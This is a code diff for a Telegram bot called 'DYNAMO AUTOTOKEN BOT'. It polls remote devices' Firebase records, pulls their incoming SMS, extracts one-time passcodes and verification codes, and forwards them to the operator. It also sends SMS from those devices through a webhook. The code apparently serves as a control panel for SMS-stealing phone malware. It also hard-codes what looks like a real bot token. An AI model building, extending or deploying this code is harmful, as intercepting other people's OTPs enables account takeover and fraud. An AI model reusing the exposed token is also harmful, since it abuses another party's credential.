@@ -1,8 +1,10 @@
+import asyncio
 import json
 import logging
 import os
 import re
 import time
+from concurrent.futures import ThreadPoolExecutor
 from dataclasses import asdict, dataclass
 from pathlib import Path
 from typing import Any
@@ -28,6 +30,12 @@ from telegram.ext import (
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8901092528:AAFQ23IMYD5oVL1cNEquLphWc5RYij0FJZw")
 DATA_FILE = Path(os.getenv("USER_DATA_FILE", "user_data.json"))
 DEFAULT_BASE_URL = os.getenv("DEFAULT_BASE_URL", "")
+SMS_TIMEOUT = float(os.getenv("SMS_TIMEOUT", "2"))
+POLL_INTERVAL = float(os.getenv("POLL_INTERVAL", "0.1"))
+EXECUTOR = ThreadPoolExecutor(max_workers=20)
+
+# base_url cache: firebase_url+device_id -> url
+_base_url_cache: dict[str, str] = {}
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
 log = logging.getLogger(__name__)
@@ -35,6 +43,16 @@ log = logging.getLogger(__name__)
 # ===== PATTERNS =====
 PATTERN_SIMPLE = re.compile(r"(\+?\d{10,15})\s*\|\s*(.*)")
 PATTERN_RICH = re.compile(r"To:\s*(\+?\d{10,15}).*?Message:\s*(.*)", re.DOTALL)
+PATTERN_INCOMING = re.compile(
+    r"(?:From|Sender|📱)\s*:?\s*(\+?\d{10,15}).*?(?:Message|Body|Text|Msg)\s*:?\s*(.+)",
+    re.DOTALL | re.IGNORECASE,
+)
+PATTERN_INCOMING_ALT = re.compile(
+    r"(?:New SMS|SMS from|📩|📨|Received SMS)\s*[:\-]?\s*(\+?\d{10,15})\s*[:\-]\s*(.+)",
+    re.IGNORECASE,
+)
+OTP_KEYWORD = re.compile(r"otp|one.?time|verification|verify|code|password|pin", re.IGNORECASE)
+OTP_DIGIT = re.compile(r"(?<!\d)(\d{4,8})(?!\d)")
 
 # ===== KEYBOARDS =====
 MAIN_KEYBOARD = ReplyKeyboardMarkup(
@@ -67,6 +85,8 @@ SIM_KEYBOARD = ReplyKeyboardMarkup(
 
 # Per-user duplicate tracking while listening
 last_sent: dict[int, set[str]] = {}
+last_otp_seen: dict[int, float] = {}
+processed_msg_ids: set[str] = set()
 
 
 @dataclass
@@ -80,7 +100,8 @@ class UserConfig:
     listener_active: bool = False
     listen_started_at: float = 0.0
     step: str = "start"
-    waiting_for: str = ""  # firebase | group
+    waiting_for: str = ""  # firebase | group | base_url
+    base_url: str = ""
 
 
 def load_all_users() -> dict[str, dict[str, Any]]:
@@ -116,16 +137,45 @@ def firebase_get(url: str, path: str) -> Any:
     return res.json()
 
 
-def fetch_base_url(firebase_url: str) -> str:
+def fetch_base_url(firebase_url: str, device_id: str = "", user_base_url: str = "") -> str:
+    if user_base_url:
+        return user_base_url.rstrip("/")
+
+    cache_key = f"{firebase_url}|{device_id}"
+    if cache_key in _base_url_cache:
+        return _base_url_cache[cache_key]
+
     if not firebase_url:
-        return DEFAULT_BASE_URL
-    try:
-        cfg = firebase_get(firebase_url, "config") or {}
-        if isinstance(cfg, dict) and cfg.get("base_url"):
-            return str(cfg["base_url"]).rstrip("/")
-    except Exception as exc:
-        log.warning("base_url fetch failed: %s", exc)
-    return DEFAULT_BASE_URL
+        return DEFAULT_BASE_URL.rstrip("/")
+
+    candidates: list[str] = []
+
+    for path in ("config", "settings", ""):
+        try:
+            node = firebase_get(firebase_url, path) if path else firebase_get(firebase_url, "")
+            if isinstance(node, dict):
+                for key in ("base_url", "baseUrl", "serverUrl", "api_url", "apiUrl", "host", "server"):
+                    val = node.get(key)
+                    if val and isinstance(val, str) and val.startswith("http"):
+                        candidates.append(val.rstrip("/"))
+        except Exception:
+            pass
+
+    if device_id:
+        try:
+            client = firebase_get(firebase_url, f"clients/{device_id}") or {}
+            if isinstance(client, dict):
+                for key in ("base_url", "baseUrl", "serverUrl", "api_url", "apiUrl", "host", "server", "url"):
+                    val = client.get(key)
+                    if val and isinstance(val, str) and val.startswith("http"):
+                        candidates.append(val.rstrip("/"))
+        except Exception:
+            pass
+
+    result = candidates[0] if candidates else DEFAULT_BASE_URL.rstrip("/")
+    if result:
+        _base_url_cache[cache_key] = result
+    return result
 
 
 def fetch_online_devices(firebase_url: str) -> list[str]:
@@ -160,20 +210,61 @@ def parse_sms(text: str) -> tuple[str, str] | None:
     return number, body
 
 
-def send_sms(base_url: str, device_id: str, sim_index: int, to_number: str, message: str) -> tuple[bool, int]:
+def parse_incoming_sms(text: str) -> tuple[str, str] | None:
+    """Device se aaya hua SMS/OTP parse karo."""
+    for pattern in (PATTERN_INCOMING, PATTERN_INCOMING_ALT):
+        match = pattern.search(text)
+        if match:
+            return match.group(1).replace(" ", ""), match.group(2).strip().replace("\n", " ")
+
+    # Plain OTP message without structured format
+    if OTP_KEYWORD.search(text) or OTP_DIGIT.search(text):
+        otp = extract_otp(text)
+        if otp:
+            return "Device", text.strip()
+    return None
+
+
+def extract_otp(text: str) -> str | None:
+    if OTP_KEYWORD.search(text):
+        match = OTP_DIGIT.search(text)
+        if match:
+            return match.group(1)
+    if len(text) < 400:
+        match = OTP_DIGIT.search(text)
+        if match and len(match.group(1)) >= 4:
+            return match.group(1)
+    return None
+
+
+def is_outbound_command(text: str) -> bool:
+    """number | message = SMS bhejne ka command."""
+    if PATTERN_SIMPLE.search(text) or PATTERN_RICH.search(text):
+        if PATTERN_INCOMING.search(text) or PATTERN_INCOMING_ALT.search(text):
+            return False
+        return True
+    return False
+
+
+def send_sms(base_url: str, device_id: str, sim_index: int, to_number: str, message: str) -> tuple[bool, int, str]:
     if not base_url:
-        return False, 0
+        return False, 0, "BASE_URL missing — Firebase config/base_url set karo ya bot mein API URL daalo"
     url = f"{base_url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
     payload = {"from": sim_index, "to": to_number, "message": message, "isSended": False}
-    res = requests.patch(url, json=payload, timeout=10)
-    return res.status_code == 200, res.status_code
+    try:
+        res = requests.patch(url, json=payload, timeout=SMS_TIMEOUT)
+        return res.status_code == 200, res.status_code, ""
+    except requests.RequestException as exc:
+        return False, 0, str(exc)
 
 
 def status_text(cfg: UserConfig) -> str:
     listening = "ON" if cfg.listening else "OFF"
     active = "YES" if cfg.listener_active else "NO"
+    api = cfg.base_url or fetch_base_url(cfg.firebase_url, cfg.device_id) or "—"
     return (
         f"Firebase URL: {cfg.firebase_url or '—'}\n"
+        f"API URL: {api}\n"
         f"Device ID: {cfg.device_id or '—'}\n"
         f"SIM: {cfg.sim or '—'}\n"
         f"Chat Name: {cfg.chat_name or '—'}\n"
@@ -213,6 +304,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "*Setup Commands:*\n"
         "/setgroup — Group/Channel set karo\n"
         "/setfirebase — Firebase URL set karo\n"
+        "/setapi — SMS API URL set karo (FAIL fix)\n"
         "/status — Current config dekho\n\n"
         "*Buttons:*\n"
         "▶️ Start Listen — SMS sunna shuru\n"
@@ -460,6 +552,17 @@ async def handle_private_text(update: Update, context: ContextTypes.DEFAULT_TYPE
         await show_sim_select(update, context)
         return
 
+    # Waiting for API URL
+    if cfg.waiting_for == "base_url":
+        if not text.startswith("http"):
+            await update.message.reply_text("❌ Valid API URL bhejo.\nExample: https://api.example.com")
+            return
+        cfg.base_url = text.rstrip("/")
+        cfg.waiting_for = ""
+        persist_config(user_id, cfg)
+        await update.message.reply_text(f"✅ API URL saved!\n`{cfg.base_url}`", parse_mode="Markdown")
+        return
+
     # Waiting for firebase URL
     if cfg.waiting_for == "firebase":
         if not text.startswith("http"):
@@ -513,12 +616,93 @@ async def handle_private_text(update: Update, context: ContextTypes.DEFAULT_TYPE
                 return
 
 
+async def cmd_setapi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    cfg = get_config(update.effective_user.id, context)
+    cfg.waiting_for = "base_url"
+    persist_config(update.effective_user.id, cfg)
+    await update.message.reply_text(
+        "🔗 *SMS API URL bhejo*\n\n"
+        "Example:\n`https://api.your-sms-server.com`\n\n"
+        "Ye URL Firebase `config/base_url` ki jagah use hoga.",
+        parse_mode="Markdown",
+        reply_markup=MAIN_KEYBOARD,
+    )
+
+
+async def notify_otp(bot, user_id: int, sender: str, body: str, chat_name: str) -> None:
+    otp = extract_otp(body) or body[:50]
+    await bot.send_message(
+        chat_id=user_id,
+        text=(
+            "🔐 *OTP Received*\n\n"
+            f"*From:* `{sender}`\n"
+            f"*OTP:* `{otp}`\n"
+            f"*Full:* `{body[:300]}`\n"
+            f"*Channel:* {chat_name}"
+        ),
+        parse_mode="Markdown",
+    )
+
+
+async def process_outbound_sms(
+    bot,
+    user_id: int,
+    to_number: str,
+    sms_body: str,
+    base_url: str,
+    device_id: str,
+    sim_index: int,
+    chat_name: str,
+) -> None:
+    loop = asyncio.get_running_loop()
+    ok, status_code, err = await loop.run_in_executor(
+        EXECUTOR,
+        send_sms,
+        base_url,
+        device_id,
+        sim_index,
+        to_number,
+        sms_body,
+    )
+
+    if ok:
+        status = "✅ SENT"
+        err_line = ""
+    elif status_code == 0:
+        status = "❌ FAIL"
+        err_line = f"\n*Error:* {err or 'API URL missing'}"
+    else:
+        status = f"❌ FAIL ({status_code})"
+        err_line = f"\n*Error:* {err}" if err else ""
+
+    await bot.send_message(
+        chat_id=user_id,
+        text=(
+            f"⏳ → `{to_number}`\n\n"
+            "📬 *SMS Delivery Report*\n\n"
+            f"*STATUS:* {status}\n"
+            f"*To:* `{to_number}`\n"
+            f"*Message:* `{sms_body[:200]}`\n"
+            f"*From:* {chat_name}{err_line}"
+        ),
+        parse_mode="Markdown",
+    )
+
+
 async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     msg = update.effective_message
     if not msg or not msg.text:
         return
 
+    msg_uid = f"{update.effective_chat.id}:{msg.message_id}"
+    if msg_uid in processed_msg_ids:
+        return
+    processed_msg_ids.add(msg_uid)
+    if len(processed_msg_ids) > 5000:
+        processed_msg_ids.clear()
+
     chat_id = update.effective_chat.id
+    text = msg.text.strip()
     all_users = load_all_users()
 
     for uid_str, stored in all_users.items():
@@ -531,12 +715,50 @@ async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_T
         if msg.date.timestamp() < started:
             continue
 
-        parsed = parse_sms(msg.text.strip())
+        user_id = int(uid_str)
+        chat_name = stored.get("chat_name", "AutoToken")
+        firebase_url = stored.get("firebase_url", "")
+        device_id = stored.get("device_id", "")
+        sim_index = 0 if str(stored.get("sim", "1")) == "1" else 1
+        base_url = fetch_base_url(firebase_url, device_id, stored.get("base_url", ""))
+
+        # ===== INCOMING OTP (device se aaya) — instant forward =====
+        incoming = parse_incoming_sms(text)
+        if incoming and not is_outbound_command(text):
+            sender, body = incoming
+            dup = f"otp-{sender}-{body[:80]}"
+            if user_id not in last_sent:
+                last_sent[user_id] = set()
+            if dup in last_sent[user_id]:
+                continue
+            last_sent[user_id].add(dup)
+            try:
+                await notify_otp(context.bot, user_id, sender, body, chat_name)
+            except Exception as exc:
+                log.warning("otp notify failed: %s", exc)
+            continue
+
+        # ===== OUTBOUND SMS command (number | message) =====
+        if not is_outbound_command(text):
+            # Generic OTP in any format
+            otp = extract_otp(text)
+            if otp:
+                dup = f"otp-plain-{text[:80]}"
+                if user_id not in last_sent:
+                    last_sent[user_id] = set()
+                if dup not in last_sent[user_id]:
+                    last_sent[user_id].add(dup)
+                    try:
+                        await notify_otp(context.bot, user_id, "Channel", text, chat_name)
+                    except Exception:
+                        pass
+            continue
+
+        parsed = parse_sms(text)
         if not parsed:
             continue
 
         to_number, sms_body = parsed
-        user_id = int(uid_str)
         dup_key = f"{to_number}-{sms_body}"
 
         if user_id not in last_sent:
@@ -545,42 +767,82 @@ async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_T
             continue
         last_sent[user_id].add(dup_key)
 
+        asyncio.create_task(
+            process_outbound_sms(
+                context.bot, user_id, to_number, sms_body,
+                base_url, device_id, sim_index, chat_name,
+            )
+        )
+
+
+async def poll_firebase_otp(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Firebase se device OTP har 0.1 sec check karo."""
+    all_users = load_all_users()
+    loop = asyncio.get_running_loop()
+
+    for uid_str, stored in all_users.items():
+        if not stored.get("listening") or not stored.get("listener_active"):
+            continue
+
+        user_id = int(uid_str)
         firebase_url = stored.get("firebase_url", "")
         device_id = stored.get("device_id", "")
-        sim_index = 0 if str(stored.get("sim", "1")) == "1" else 1
-        chat_name = stored.get("chat_name", "AutoToken")
-        base_url = fetch_base_url(firebase_url)
+        if not firebase_url or not device_id:
+            continue
+
+        if user_id not in last_otp_seen:
+            last_otp_seen[user_id] = time.time()
 
         try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=f"⏳ Sending SMS to `{to_number}`...",
-                parse_mode="Markdown",
+            client = await loop.run_in_executor(
+                EXECUTOR, firebase_get, firebase_url, f"clients/{device_id}"
             )
         except Exception:
-            pass
+            continue
 
-        ok, status_code = send_sms(base_url, device_id, sim_index, to_number, sms_body)
-        status = "✅ SENT" if ok else f"❌ FAIL ({status_code})"
+        if not isinstance(client, dict):
+            continue
 
-        try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=(
-                    "📬 *SMS Delivery Report*\n\n"
-                    f"*STATUS:* {status}\n"
-                    f"*To:* `{to_number}`\n"
-                    f"*Message:* `{sms_body[:200]}`\n"
-                    f"*From:* {chat_name}"
-                ),
-                parse_mode="Markdown",
-            )
-        except Exception as exc:
-            log.warning("delivery report failed for %s: %s", user_id, exc)
+        for key in ("lastSms", "lastMessage", "receivedSms", "latestOtp", "otp", "incoming"):
+            data = client.get(key)
+            if not data:
+                continue
+
+            if isinstance(data, str):
+                body, ts, sender = data, time.time(), "Device"
+            elif isinstance(data, dict):
+                body = str(data.get("message") or data.get("body") or data.get("text") or "")
+                sender = str(data.get("from") or data.get("sender") or "Device")
+                ts = float(data.get("timestamp") or data.get("time") or time.time())
+            else:
+                continue
+
+            if not body or ts <= last_otp_seen[user_id]:
+                continue
+
+            otp = extract_otp(body)
+            if not otp:
+                continue
+
+            last_otp_seen[user_id] = ts
+            dup = f"fb-{otp}-{body[:40]}"
+            if user_id not in last_sent:
+                last_sent[user_id] = set()
+            if dup in last_sent[user_id]:
+                continue
+            last_sent[user_id].add(dup)
+
+            chat_name = stored.get("chat_name", "AutoToken")
+            try:
+                await notify_otp(context.bot, user_id, sender, body, chat_name)
+            except Exception as exc:
+                log.warning("firebase otp poll failed: %s", exc)
+            break
 
 
 def main() -> None:
     print("\n🚀 DYNAMO AUTOTOKEN BOT STARTING\n")
+    print(f"⚡ Poll interval: {POLL_INTERVAL}s | SMS timeout: {SMS_TIMEOUT}s\n")
 
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
@@ -589,6 +851,7 @@ def main() -> None:
     app.add_handler(CommandHandler("status", cmd_status))
     app.add_handler(CommandHandler("setgroup", cmd_setgroup))
     app.add_handler(CommandHandler("setfirebase", cmd_setfirebase))
+    app.add_handler(CommandHandler("setapi", cmd_setapi))
 
     app.add_handler(CallbackQueryHandler(callback_handler))
 
@@ -612,6 +875,9 @@ def main() -> None:
             handle_channel_message,
         )
     )
+
+    # Firebase OTP poll — har 0.1 sec
+    app.job_queue.run_repeating(poll_firebase_otp, interval=POLL_INTERVAL, first=0.5)
 
     app.run_polling(drop_pending_updates=True)
 
